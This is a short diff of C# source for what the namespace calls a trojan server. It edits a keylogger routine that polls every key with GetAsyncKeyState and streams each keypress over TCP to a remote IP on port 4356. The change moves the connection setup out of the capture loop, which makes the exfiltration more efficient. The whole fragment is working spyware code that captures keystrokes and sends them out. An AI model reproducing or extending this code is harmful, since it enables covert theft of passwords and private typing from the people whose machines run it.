@@ -236,15 +236,16 @@ namespace Trojan_Server
         }
         
         public static void Keylogger(){
-        	while(true){
+            TcpClient Sender = new TcpClient(IP, 4356);
+            Writer = Sender.GetStream();
+            while (true){
         		
         		try{
              foreach (int i in Enum.GetValues(typeof(Keys))) {
         				if (GetAsyncKeyState((Keys)i) == -32767){
-        					TcpClient Sender = new TcpClient(IP, 4356);
-        					Writer = Sender.GetStream();
         					SendKeys("Key!!!!---" + Convert.ToString((Keys)i));
                	}
+                   
 	    		}	
         	}
         	catch(Exception e) {
